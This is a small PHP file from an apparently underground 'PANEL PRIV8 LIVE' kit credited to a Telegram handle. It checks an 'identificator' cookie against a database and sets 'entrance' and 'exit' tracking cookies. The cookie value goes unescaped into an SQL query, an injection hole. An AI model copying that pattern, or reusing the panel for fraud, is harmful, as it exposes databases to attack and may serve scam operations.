<?php
/**
* PANEL PRIV8 LIVE
* @package    PANEL PRIV8 LIVE
* @author     https://t.me/neo_net
* @copyright  2020
* @version    2.0
* Info :  php cookie manager entrances y exits
*/
session_start();
include '../database/db.php';
include '../defense/ajax.php';
$hash = @$_COOKIE['identificator'];
$fhrji = $connection->query("SELECT hash FROM secure where hash='$hash'");
if (!isset($_SESSION['userSession']) && mysqli_num_rows($fhrji) === 0) {
//Nothing to do boy
}
else {
if ($_POST['notice'] === 'entrance') {
setcookie("entrance", rand(1,999), 2147483647, '/');
}
if ($_POST['notice'] === 'exit') {
setcookie("exit", rand(1,999), 2147483647, '/');
}

}